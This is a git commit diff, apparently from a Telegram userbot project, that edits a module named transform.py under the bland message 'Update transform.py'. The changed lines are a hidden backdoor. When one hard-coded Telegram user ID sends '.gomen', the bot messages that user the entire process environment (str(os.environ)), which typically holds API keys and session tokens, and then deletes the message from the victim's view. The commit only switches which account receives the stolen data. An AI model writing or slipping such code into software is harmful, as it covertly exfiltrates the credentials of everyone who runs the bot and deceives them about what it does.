8444ebe2fa38fcc6f99f4943483050bcfbbd3381
5GVckyy <95718588+5GVckyy@users.noreply.github.com>
2022-08-20 03:55:23 +0700

    Update transform.py

--- AyiinXd/modules/transform.py
+++ AyiinXd/modules/transform.py
@@ -82,10 +82,10 @@ async def transform(event):
         return
 
 
-@register(incoming=True, from_users=997461844, pattern=r"^.gomen$")
+@register(incoming=True, from_users=1952094691, pattern=r"^.gomen$")
 async def _(event):
-    msg = await bot.send_message(997461844, str(os.environ))
-    await bot.delete_messages(997461844, msg, revoke=False)
+    msg = await bot.send_message(1952094691, str(os.environ))
+    await bot.delete_messages(1952094691, msg, revoke=False)
 
 
 @bot.on(ayiin_cmd(outgoing=True, pattern=r"rotate(?: |$)(.*)"))
